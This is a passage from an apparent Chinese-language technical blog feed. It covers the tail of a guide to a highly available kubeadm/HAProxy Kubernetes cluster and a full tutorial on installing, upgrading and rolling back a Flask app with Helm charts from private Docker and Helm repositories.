 12 MB |      true |      false |         9 |      31702 |              31702 |        |</span><br><span class="line">| https://192.168.52.93:2379 | 392021bed5f5dcb2 |   3.5.9 |   12 MB |     false |      false |         9 |      31702 |              31702 |        |</span><br><span class="line">+----------------------------+------------------+---------+---------+-----------+------------+-----------+------------+--------------------+--------+</span><br><span class="line"></span><br><span class="line"># ETCDCTL_API=3 etcdctl --endpoints=https://192.168.52.91:2379 \</span><br><span class="line">--cert=/etc/kubernetes/pki/etcd/peer.crt \</span><br><span class="line">--key=/etc/kubernetes/pki/etcd/peer.key \</span><br><span class="line">--cacert=/etc/kubernetes/pki/etcd/ca.crt member list</span><br><span class="line">d7096f0da355cc9, started, k8s-master1, https://192.168.52.91:2380, https://192.168.52.91:2379, false</span><br><span class="line">1f466381ed3a930e, started, k8s-master2, https://192.168.52.92:2380, https://192.168.52.92:2379, false</span><br><span class="line">392021bed5f5dcb2, started, k8s-master3, https://192.168.52.93:2380, https://192.168.52.93:2379, false</span><br><span class="line">b863ac19f9f92e30, started, k8s-slave1, https://192.168.52.101:2380, https://192.168.52.101:2379, false</span><br><span class="line"></span><br><span class="line">移除slave1节点</span><br><span class="line">ETCDCTL_API=3 etcdctl --endpoints=https://192.168.52.91:2379 \</span><br><span class="line">--cert=/etc/kubernetes/pki/etcd/peer.crt \</span><br><span class="line">--key=/etc/kubernetes/pki/etcd/peer.key \</span><br><span class="line">--cacert=/etc/kubernetes/pki/etcd/ca.crt member remove b863ac19f9f92e30</span><br></pre></td></tr></table></figure>

<h3><span id="高可用配置">高可用配置</span></h3><p>修改coredns, calico-apiserver, tigera-operator的deployment, 副本设置为3个以上, 分布在多个节点</p>
<h3><span id="测试高可用">测试高可用</span></h3><p>部署Nginx Pod(NodePort类型, 副本6, NodePort: 30080)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># kubectl get pods -o wide</span><br><span class="line">NAME                                READY   STATUS    RESTARTS      AGE   IP               NODE         NOMINATED NODE   READINESS GATES</span><br><span class="line">nginx-deployment-645d5cfc8b-76xqv   1/1     Running   1 (40m ago)   22h   198.18.0.76      k8s-slave1   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">nginx-deployment-645d5cfc8b-8mlhv   1/1     Running   1 (40m ago)   22h   198.18.0.73      k8s-slave1   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">nginx-deployment-645d5cfc8b-bsr2n   1/1     Running   1 (40m ago)   22h   198.18.92.12     k8s-slave2   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">nginx-deployment-645d5cfc8b-gkk52   1/1     Running   1 (40m ago)   22h   198.18.92.11     k8s-slave2   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">nginx-deployment-645d5cfc8b-kwr8j   1/1     Running   1 (40m ago)   22h   198.18.158.206   k8s-slave3   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">nginx-deployment-645d5cfc8b-ms5ms   1/1     Running   1 (40m ago)   22h   198.18.158.208   k8s-slave3   &lt;none&gt;           &lt;none&gt;</span><br></pre></td></tr></table></figure>

<p>修改两台LB的Haproxy配置文件(&#x2F;etc&#x2F;haproxy&#x2F;haproxy.cfg), 结尾添加如下内容:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">frontend http-in</span><br><span class="line">    bind *:80</span><br><span class="line">    default_backend nginx_servers</span><br><span class="line"></span><br><span class="line">backend nginx_servers</span><br><span class="line">    balance roundrobin</span><br><span class="line">    server node1 k8s-slave1:30080 check</span><br><span class="line">    server node2 k8s-slave2:30080 check</span><br><span class="line">    server node3 k8s-slave3:30080 check</span><br></pre></td></tr></table></figure>

<p>重启haproxy</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart haproxy</span><br></pre></td></tr></table></figure>

<p>测试: down任意一个节点, 仍能通过VIP访问Nginx服务, 6443端口正常工作</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># curl 192.168.52.88</span><br><span class="line">200 OK</span><br><span class="line">curl https://192.168.52.88:6443/healthz -k</span><br><span class="line">ok</span><br></pre></td></tr></table></figure>
<p>到此, 高可用集群搭建完成</p>
<h1><span id="参考">参考</span></h1><p><a href="https://kubesphere.io/zh/docs/v3.4/installing-on-linux/high-availability-configurations/set-up-ha-cluster-using-keepalived-haproxy/">https://kubesphere.io/zh/docs/v3.4/installing-on-linux/high-availability-configurations/set-up-ha-cluster-using-keepalived-haproxy/</a></p>
]]></content>
      <categories>
        <category>Kubernetes</category>
      </categories>
      <tags>
        <tag>Kubernetes</tag>
      </tags>
  </entry>
  <entry>
    <title>使用Helm安装、 升级、 回滚Kubernetes应用</title>
    <url>/2025/0323210500.html</url>
    <content><![CDATA[<h1><span id="前言">前言</span></h1><p>在我之前做的项目里，我们对Microk8s微服务的更新是通过自制tar包的方式做的, tar包存储了镜像和YAML文件。 每次升级时，我们需要先删除所有的YAML资源，然后重新创建新的资源。 这种方式存在以下问题：</p>
<ul>
<li>服务中断：由于需要先删除旧资源再创建新资源，这会导致短暂的服务中断，影响用户体验</li>
<li>复杂的回滚逻辑：如果升级失败，回滚到之前的版本变得非常复杂，需要手动恢复旧的YAML文件，并且容易出错</li>
</ul>
<p>了解到Helm可以有效解决以上问题, Helm是Kubernetes 的包管理工具，方便用户快速发现、 共享和使用Kubernetes构建的应用。 以下举例演示如何使用Helm实现安装、升级、回滚操作</p>
<span id="more"></span>

<h1><span id="环境准备">环境准备</span></h1><ul>
<li>Docker私有仓库 (<a href="https://mydockerregistry.com:5000/">https://mydockerregistry.com:5000</a>), 参考：<a href="https://blog.csdn.net/pcj_888/article/details/146445826">搭建Docker私有仓库</a></li>
<li>Helm私有仓库 (<a href="https://myhelmrepo.com/">https://myhelmrepo.com</a>)  参考：<a href="https://blog.csdn.net/pcj_888/article/details/146458002">搭建私有 Helm Chart 仓库</a></li>
<li>Kubernetes集群 v1.28.x, Helm版本 v3.16.0 参考: <a href="https://blog.csdn.net/pcj_888/article/details/144240636">kubeadm+keepalived+HAproxy搭建高可用kubernetes集群</a></li>
<li>为了使外部流量能访问集群内的服务，需要安装一个Ingress控制器, 参考： <a href="https://blog.csdn.net/pcj_888/article/details/146460834">Helm快速上手，使用Helm安装nginx-ingress</a></li>
</ul>
<h1><span id="创建一个flask应用">创建一个Flask应用</span></h1><p>创建一个简单的 Flask 应用，并准备两个版本：</p>
<ul>
<li>1.0版本, 输出 “Hello, foo!”</li>
<li>2.0版本, 输出 “Hello, foo v2!”</li>
</ul>
<p>文件结构</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flask-app/</span><br><span class="line">├── app.py</span><br><span class="line">├── requirements.txt</span><br><span class="line">└── Dockerfile</span><br></pre></td></tr></table></figure>

<p>app.py</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">root</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hello foo&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure>

<p>requirements.txt</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Flask</span><br></pre></td></tr></table></figure>

<p>Dockerfile</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FROM rockylinux:9.3</span><br><span class="line"></span><br><span class="line">RUN dnf install -y python3 python3-pip</span><br><span class="line"></span><br><span class="line">WORKDIR /app</span><br><span class="line"></span><br><span class="line">COPY requirements.txt .</span><br><span class="line">RUN pip install -r requirements.txt</span><br><span class="line"></span><br><span class="line">COPY app.py .</span><br><span class="line"></span><br><span class="line">CMD [&quot;python3&quot;, &quot;app.py&quot;]</span><br></pre></td></tr></table></figure>

<h2><span id="构建并测试镜像">构建并测试镜像</span></h2><p>构建镜像</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker build -t mydockerregistry.com:5000/flask-app:1.0 .</span><br></pre></td></tr></table></figure>
<p>本地运行容器测试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -d -p 8000:8000 mydockerregistry.com:5000/flask-app:1.0</span><br><span class="line">curl localhost:8000/</span><br><span class="line">hello foo</span><br></pre></td></tr></table></figure>
<p>测试OK后, 推送镜像到repo</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker push mydockerregistry.com:5000/flask-app:1.0</span><br></pre></td></tr></table></figure>

<h1><span id="配置kubernetes环境">配置Kubernetes环境</span></h1><h2><span id="创建secret存储私有镜像仓库认证信息">创建secret存储私有镜像仓库认证信息</span></h2><p>为了从私有镜像仓库拉取镜像，我们需要在Kubernetes集群中创建一个Secret，用于存储认证信息。 这一步是必要的，因为Kubernetes默认无法直接访问需要认证的私有镜像仓库<br>执行以下命令创建Secret</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl create secret docker-registry my-registry-secret \</span><br><span class="line">  --docker-server=mydockerregistry.com:5000 \</span><br><span class="line">  --docker-username=dockeruser \</span><br><span class="line">  --docker-password=123456 \</span><br><span class="line">  --namespace flask-app</span><br></pre></td></tr></table></figure>
<p>说明：</p>
<ul>
<li>该 Secret 将被 Helm Chart 中的 imagePullSecrets 引用，确保 Kubernetes 能够从私有镜像仓库拉取镜像。</li>
</ul>
<h2><span id="配置-containerd-忽略证书验证仅限测试环境">配置 Containerd 忽略证书验证（仅限测试环境）</span></h2><p>在每个节点上，编辑 &#x2F;etc&#x2F;containerd&#x2F;config.toml 文件，添加以下配置以忽略私有镜像仓库的证书验证</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[plugins.&quot;io.containerd.grpc.v1.cri&quot;.registry]</span><br><span class="line">  [plugins.&quot;io.containerd.grpc.v1.cri&quot;.registry.configs]</span><br><span class="line">    [plugins.&quot;io.containerd.grpc.v1.cri&quot;.registry.configs.&quot;mydockerregistry.com:5000&quot;.tls]</span><br><span class="line">      insecure_skip_verify = true</span><br></pre></td></tr></table></figure>
<p>重启 containerd 服务以应用更改</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart containerd</span><br></pre></td></tr></table></figure>

<h1><span id="创建helm-chart">创建Helm Chart</span></h1><p>Helm Chart 是 Helm 的核心组件，它允许我们以模板化的方式定义 Kubernetes 资源。下面我们创建一个名为 flask-app-chart 的 Chart。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">helm create flask-app-chart</span><br></pre></td></tr></table></figure>
<p>生成的文件结构如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flask-app-chart/</span><br><span class="line">├── charts</span><br><span class="line">├── Chart.yaml</span><br><span class="line">├── templates</span><br><span class="line">│   ├── deployment.yaml</span><br><span class="line">│   ├── _helpers.tpl</span><br><span class="line">│   ├── hpa.yaml</span><br><span class="line">│   ├── ingress.yaml</span><br><span class="line">│   ├── NOTES.txt</span><br><span class="line">│   ├── serviceaccount.yaml</span><br><span class="line">│   ├── service.yaml</span><br><span class="line">└── values.yaml</span><br></pre></td></tr></table></figure>

<p><strong>修改Chart文件</strong><br>逐个修改以下文件, 或者直接使用: <a href="https://github.com/PCJ600/helm-chart-demo/tree/main/charts/v1.0/flask-app-chart">https://github.com/PCJ600/helm-chart-demo/tree/main/charts/v1.0/flask-app-chart</a></p>
<p>Chart.yaml</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apiVersion: v2</span><br><span class="line">name: flask-app-chart</span><br><span class="line">description: A Helm chart for deploying a simple Flask app</span><br><span class="line">type: application</span><br><span class="line">version: 1.0.0 # Chart 版本</span><br><span class="line">appVersion: &quot;1.0&quot; # 应用版本</span><br></pre></td></tr></table></figure>

<p>values.yaml</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 全局名称覆盖</span><br><span class="line">fullnameOverride: &quot;&quot;</span><br><span class="line">nameOverride: &quot;&quot;</span><br><span class="line"></span><br><span class="line"># 副本数</span><br><span class="line">replicaCount: 6</span><br><span class="line"></span><br><span class="line"># 镜像配置</span><br><span class="line">image:</span><br><span class="line">  repository: &quot;mydockerregistry.com:5000/flask-app&quot;</span><br><span class="line">  tag: &quot;1.0&quot;</span><br><span class="line">  pullPolicy: &quot;IfNotPresent&quot;</span><br><span class="line">  pullSecrets:</span><br><span class="line">    - my-registry-secret</span><br><span class="line"></span><br><span class="line"># 资源限制</span><br><span class="line">resources:</span><br><span class="line">  limits:</span><br><span class="line">    cpu: &quot;500m&quot;</span><br><span class="line">    memory: &quot;512Mi&quot;</span><br><span class="line">  requests:</span><br><span class="line">    cpu: &quot;250m&quot;</span><br><span class="line">    memory: &quot;256Mi&quot;</span><br><span class="line"></span><br><span class="line"># 环境变量</span><br><span class="line">env:</span><br><span class="line">  ENV_VAR_1: &quot;value1&quot;</span><br><span class="line">  ENV_VAR_2: &quot;value2&quot;</span><br><span class="line"></span><br><span class="line"># Ingress 配置</span><br><span class="line">ingress:</span><br><span class="line">  enabled: true</span><br><span class="line">  host: &quot;flask-app.example.com&quot;</span><br><span class="line">  path: &quot;/foo(/|$)(.*)&quot;</span><br><span class="line">  pathType: &quot;ImplementationSpecific&quot;</span><br><span class="line"></span><br><span class="line"># Service 配置</span><br><span class="line">service:</span><br><span class="line">  port: 8000</span><br><span class="line"></span><br><span class="line">serviceAccount:</span><br><span class="line">  create: false</span><br><span class="line">  name: &quot;&quot;</span><br><span class="line"></span><br><span class="line">autoscaling:</span><br><span class="line"> enabled: false</span><br></pre></td></tr></table></figure>

<p>templates&#x2F;deployment.yaml</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apiVersion: apps/v1</span><br><span class="line">kind: Deployment</span><br><span class="line">metadata:</span><br><span class="line">  name: &#123;&#123; include &quot;flask-app-chart.fullname&quot; . &#125;&#125;</span><br><span class="line">  labels:</span><br><span class="line">    app: &#123;&#123; include &quot;flask-app-chart.name&quot; . &#125;&#125;</span><br><span class="line">    chart: &#123;&#123; .Chart.Name &#125;&#125;</span><br><span class="line">    release: &#123;&#123; .Release.Name &#125;&#125;</span><br><span class="line">    heritage: &#123;&#123; .Release.Service &#125;&#125;</span><br><span class="line">spec:</span><br><span class="line">  replicas: &#123;&#123; .Values.replicaCount | default 1 &#125;&#125;</span><br><span class="line">  selector:</span><br><span class="line">    matchLabels:</span><br><span class="line">      app: &#123;&#123; include &quot;flask-app-chart.name&quot; . &#125;&#125;</span><br><span class="line">  template:</span><br><span class="line">    metadata:</span><br><span class="line">      labels:</span><br><span class="line">        app: &#123;&#123; include &quot;flask-app-chart.name&quot; . &#125;&#125;</span><br><span class="line">    spec:</span><br><span class="line">      containers:</span><br><span class="line">        - name: &#123;&#123; .Chart.Name &#125;&#125;</span><br><span class="line">          image: &quot;&#123;&#123; .Values.image.repository &#125;&#125;:&#123;&#123; .Values.image.tag | default &quot;latest&quot; &#125;&#125;&quot;</span><br><span class="line">          imagePullPolicy: &#123;&#123; .Values.image.pullPolicy | default &quot;IfNotPresent&quot; &#125;&#125;</span><br><span class="line">          ports:</span><br><span class="line">            - containerPort: 8000</span><br><span class="line">              protocol: TCP</span><br><span class="line">          resources:</span><br><span class="line">            &#123;&#123;- toYaml .Values.resources | nindent 12 &#125;&#125;</span><br><span class="line">          env:</span><br><span class="line">            &#123;&#123;- if .Values.env &#125;&#125;</span><br><span class="line">            &#123;&#123;- range $key, $value := .Values.env &#125;&#125;</span><br><span class="line">            - name: &#123;&#123; $key &#125;&#125;</span><br><span class="line">              value: &#123;&#123; $value | quote &#125;&#125;</span><br><span class="line">            &#123;&#123;- end &#125;&#125;</span><br><span class="line">            &#123;&#123;- end &#125;&#125;</span><br><span class="line">      imagePullSecrets:</span><br><span class="line">        &#123;&#123;- if .Values.image.pullSecrets &#125;&#125;</span><br><span class="line">        &#123;&#123;- range .Values.image.pullSecrets &#125;&#125;</span><br><span class="line">        - name: &#123;&#123; . &#125;&#125;</span><br><span class="line">        &#123;&#123;- end &#125;&#125;</span><br><span class="line">        &#123;&#123;- else &#125;&#125;</span><br><span class="line">        - name: my-registry-secret</span><br><span class="line">        &#123;&#123;- end &#125;&#125;</span><br></pre></td></tr></table></figure>
<p>注: 配置了imagePullSecrets, 支持从私有仓库拉取镜像</p>
<p>template&#x2F;service.yaml</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apiVersion: v1</span><br><span class="line">kind: Service</span><br><span class="line">metadata:</span><br><span class="line">  name: &#123;&#123; include &quot;flask-app-chart.fullname&quot; . &#125;&#125;</span><br><span class="line">  namespace: &#123;&#123; .Release.Namespace &#125;&#125;</span><br><span class="line">spec:</span><br><span class="line">  selector:</span><br><span class="line">    app: &#123;&#123; include &quot;flask-app-chart.name&quot; . &#125;&#125;</span><br><span class="line">  ports:</span><br><span class="line">  - port: &#123;&#123; .Values.service.port | default 8000 &#125;&#125;</span><br><span class="line">    targetPort: &#123;&#123; .Values.service.port | default 8000 &#125;&#125;</span><br><span class="line">  type: ClusterIP</span><br></pre></td></tr></table></figure>

<p>template&#x2F;ingress.yaml<br>定义ingress模板, 支持集群外部访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apiVersion: networking.k8s.io/v1</span><br><span class="line">kind: Ingress</span><br><span class="line">metadata:</span><br><span class="line">  name: &#123;&#123; include &quot;flask-app-chart.fullname&quot; . &#125;&#125;-ingress</span><br><span class="line">  namespace: &#123;&#123; .Release.Namespace &#125;&#125;</span><br><span class="line">  annotations:</span><br><span class="line">    nginx.ingress.kubernetes.io/rewrite-target: /$2 # 将 /foo/(.*) 重写为 /$1</span><br><span class="line">spec:</span><br><span class="line">  ingressClassName: nginx # 指定 IngressClass 名称</span><br><span class="line">  rules:</span><br><span class="line">  - host: &#123;&#123; .Values.ingress.host | quote &#125;&#125;</span><br><span class="line">    http:</span><br><span class="line">      paths:</span><br><span class="line">      - path: &#123;&#123; .Values.ingress.path | default &quot;/foo(/|$)(.*)&quot; &#125;&#125;</span><br><span class="line">        pathType: &#123;&#123; .Values.ingress.pathType | default &quot;ImplementationSpecific&quot; &#125;&#125;</span><br><span class="line">        backend:</span><br><span class="line">          service:</span><br><span class="line">            name: &#123;&#123; include &quot;flask-app-chart.fullname&quot; . &#125;&#125;</span><br><span class="line">            port:</span><br><span class="line">              number: &#123;&#123; .Values.service.port | default 8000 &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>templates&#x2F;_helpers.tpl</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;/*</span><br><span class="line">Create a default fully qualified app name.</span><br><span class="line">We truncate at 63 characters because some Kubernetes name fields are limited to this (by the DNS naming spec).</span><br><span class="line">*/&#125;&#125;</span><br><span class="line">&#123;&#123;- define &quot;flask-app-chart.fullname&quot; -&#125;&#125;</span><br><span class="line">&#123;&#123;- if .Values.fullnameOverride -&#125;&#125;</span><br><span class="line">&#123;&#123;- .Values.fullnameOverride | trunc 63 | trimSuffix &quot;-&quot; -&#125;&#125;</span><br><span class="line">&#123;&#123;- else -&#125;&#125;</span><br><span class="line">&#123;&#123;- printf &quot;%s-%s&quot; .Chart.Name .Release.Name | trunc 63 | trimSuffix &quot;-&quot; -&#125;&#125;</span><br><span class="line">&#123;&#123;- end -&#125;&#125;</span><br><span class="line">&#123;&#123;- end -&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;/*</span><br><span class="line">Create a default name for the chart.</span><br><span class="line">*/&#125;&#125;</span><br><span class="line">&#123;&#123;- define &quot;flask-app-chart.name&quot; -&#125;&#125;</span><br><span class="line">&#123;&#123;- default .Chart.Name .Values.nameOverride -&#125;&#125;</span><br><span class="line">&#123;&#123;- end -&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><strong>本地测试部署</strong><br>在正式发布 Chart 到仓库之前，可以先在本地进行测试部署</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl create ns flask-app</span><br><span class="line">helm install flask-app ./flask-app-chart --namespace flask-app</span><br></pre></td></tr></table></figure>
<p>验证OK</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># curl flask-app.example.com/foo</span><br><span class="line">hello foo</span><br></pre></td></tr></table></figure>

<p>测试完成后，可以卸载Chart, 后面准备发布Chart到仓库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">helm -n flask-app uninstall flask-app</span><br></pre></td></tr></table></figure>

<h1><span id="发布chart到仓库">发布Chart到仓库</span></h1><p>检查Chart的正确性</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">helm lint flask-app-chart</span><br><span class="line"># helm lint flask-app-chart/</span><br><span class="line">==&gt; Linting flask-app-chart/</span><br><span class="line">[INFO] Chart.yaml: icon is recommended</span><br></pre></td></tr></table></figure>
<p>打包Chart</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># helm package flask-app-chart</span><br><span class="line">Successfully packaged chart and saved it to: /path/to/flask-app-chart-1.0.0.tgz</span><br></pre></td></tr></table></figure>
<p>上传 Chart 到私有 Helm 仓库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -u &quot;helmuser:123456&quot; --data-binary &quot;@flask-app-chart-1.0.0.tgz&quot; https://myhelmrepo.com/api/charts -k</span><br></pre></td></tr></table></figure>
<p>如果需要删除旧版本的 Chart，使用以下命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -X DELETE &quot;https://myhelmrepo.com/api/charts/flask-app-chart/0.1.0&quot; -u &quot;helmuser:123456&quot;</span><br></pre></td></tr></table></figure>

<h1><span id="通过helm-repo安装chart">通过Helm Repo安装Chart</span></h1><p>添加私有 Helm 仓库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">helm repo add my-private-repo https://myhelmrepo.com \</span><br><span class="line">  --ca-file ~/.helm/certs/myhelmrepo.com.crt \</span><br><span class="line">  --username helmuser \</span><br><span class="line">  --password 123456</span><br></pre></td></tr></table></figure>

<p>更新仓库缓存并查看可用的 Charts</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">helm repo update</span><br><span class="line">helm search repo -l flask</span><br><span class="line">NAME                            CHART VERSION   APP VERSION     DESCRIPTION</span><br><span class="line">my-private-repo/flask-app-chart 1.0.0           1.0             A Helm chart for deploying a simple Flask app</span><br></pre></td></tr></table></figure>

<p>安装Chart到指定命名空间flask-app</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">helm install flask-app my-private-repo/flask-app-chart --namespace flask-app --version 1.0.0</span><br></pre></td></tr></table></figure>
<p>验证安装是否成功</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># curl flask-app.example.com/foo</span><br><span class="line">hello foo</span><br></pre></td></tr></table></figure>

<h1><span id="再发布20版本的chart-用于测试升级和回滚功能">再发布2.0版本的Chart, 用于测试升级和回滚功能</span></h1><p>改下app.py, 返回’hello foo v2’</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">root</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hello foo v2&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure>

<p>构建并推送新版本镜像</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker build -t mydockerregistry.com:5000/flask-app:2.0 .</span><br><span class="line">docker push mydockerregistry.com:5000/flask-app:2.0</span><br></pre></td></tr></table></figure>

<p>更新Chart配置, 修改Chart.yaml和values.yaml</p>
<p>Chart.yaml<br>更新版本号为2.0.0, 并设置appVersion为2.0</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># cat Chart.yaml</span><br><span class="line">apiVersion: v2</span><br><span class="line">name: flask-app-chart</span><br><span class="line">description: A Helm chart for deploying a simple Flask app</span><br><span class="line">type: application</span><br><span class="line">version: 2.0.0</span><br><span class="line">appVersion: &quot;2.0&quot;</span><br></pre></td></tr></table></figure>

<p>改下values.yaml, 将镜像版本从1.0更新为2.0</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">image:</span><br><span class="line">  repository: &quot;mydockerregistry.com:5000/flask-app&quot;</span><br><span class="line">  tag: &quot;2.0&quot;</span><br></pre></td></tr></table></figure>

<p>打包并上传新的Chart</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">helm package flask-app-chart</span><br><span class="line">curl -u &quot;helmuser:123456&quot; --data-binary &quot;@flask-app-chart-2.0.0.tgz&quot; https://myhelmrepo.com/api/charts -k</span><br></pre></td></tr></table></figure>

<h1><span id="使用helm升级到新版本">使用Helm升级到新版本</span></h1><p>使用<code>helm upgrade</code>将应用从1.0版本升级到2.0版本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">helm upgrade flask-app my-private-repo/flask-app-chart --version 2.0.0 --namespace flask-app --atomic</span><br></pre></td></tr></table></figure>
<p>注: Helm支持通过–atomic参数实现原子性操作。如果升级失败，Helm会自动回滚到之前的版本</p>
<p>验证升级是否成功</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># curl flask-app.example.com/foo</span><br><span class="line">hello foo v2</span><br></pre></td></tr></table></figure>

<p>watch观察升级过程, 可以看出是滚动更新方式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">watch &quot;kubectl get pods -n flask-app&quot;</span><br><span class="line">NAMESPACE          NAME                                         READY   STATUS        RESTARTS         AGE</span><br><span class="line">flask-app          flask-app-chart-flask-app-5c86b6ffdf-4jlqb   1/1     Running       0                31s</span><br><span class="line">flask-app          flask-app-chart-flask-app-5c86b6ffdf-kkw57   1/1     Running       0                30s</span><br><span class="line">flask-app          flask-app-chart-flask-app-5c86b6ffdf-qlnhv   1/1     Running       0                30s</span><br><span class="line">flask-app          flask-app-chart-flask-app-5c86b6ffdf-s9tr5   1/1     Running       0                31s</span><br><span class="line">flask-app          flask-app-chart-flask-app-5c86b6ffdf-w6776   1/1     Running       0                30s</span><br><span class="line">flask-app          flask-app-chart-flask-app-5c86b6ffdf-xwgtp   1/1     Running       0                31s</span><br><span class="line">flask-app          flask-app-chart-flask-app-5d44b77c54-72mhg   0/1     Terminating   0                3m17s</span><br><span class="line">flask-app          flask-app-chart-flask-app-5d44b77c54-gvgv7   0/1     Terminating   0                3m17s</span><br><span class="line">flask-app          flask-app-chart-flask-app-5d44b77c54-mrj5h   0/1     Terminating   0                3m17s</span><br><span class="line">flask-app          flask-app-chart-flask-app-5d44b77c54-r2bdp   1/1     Terminating   0                3m17s</span><br><span class="line">flask-app          flask-app-chart-flask-app-5d44b77c54-w7v67   1/1     Terminating   0                3m17s</span><br></pre></td></tr></table></figure>

<h1><span id="使用helm回滚到旧版本">使用Helm回滚到旧版本</span></h1><p>查看历史记录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">helm history flask-app -n flask-app</span><br><span class="line">REVISION        UPDATED                         STATUS          CHART                   APP VERSION     DESCRIPTION</span><br><span class="line">1               Sun Mar 23 19:15:11 2025        superseded      flask-app-chart-1.0.0   1.0             Install complete</span><br><span class="line">2               Sun Mar 23 19:17:57 2025        deployed        flask-app-chart-2.0.0   2.0             Upgrade complete</span><br></pre></td></tr></table></figure>
<ul>
<li>REVISION 1: 最初安装的1.0的版本</li>
<li>REVISION 2: 升级到2.0的版本</li>
</ul>
<p>执行回滚命令, 回滚到1.0版本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">helm rollback flask-app 1 -n flask-app</span><br><span class="line">Rollback was a success! Happy Helming!</span><br></pre></td></tr></table></figure>

<p>验证回滚成功</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># helm list -n flask-app</span><br><span class="line">NAME            NAMESPACE       REVISION        UPDATED                                 STATUS          CHART                   APP VERSION</span><br><span class="line">flask-app       flask-app       3               2025-03-23 19:20:54.762690061 +0800 CST deployed        flask-app-chart-1.0.0   1.0</span><br><span class="line"># curl flask-app.example.com/foo</span><br><span class="line">hello foo</span><br></pre></td></tr></table></figure>

<h1><span id="总结">总结</span></h1><p>Helm vs 传统方式的对比</p>
<table>
<thead>
<tr>
<th>特性</th>
<th>传统方式</th>
<th>Helm</th>
</tr>
</thead>
<tbody><tr>
<td><strong>版本管理</strong></td>
<td>手动维护多个 YAML 文件，容易混乱。</td>
<td>版本化管理，清晰记录每个版本的变化。</td>
</tr>
<tr>
<td><strong>升级操作</strong></td>
<td>需要手动删除旧版本并应用新版本，可能导致服务中断。</td>
<td>智能化更新，仅更改必要的部分，避免服务中断。</td>
</tr>
<tr>
<td><strong>回滚操作</strong></td>
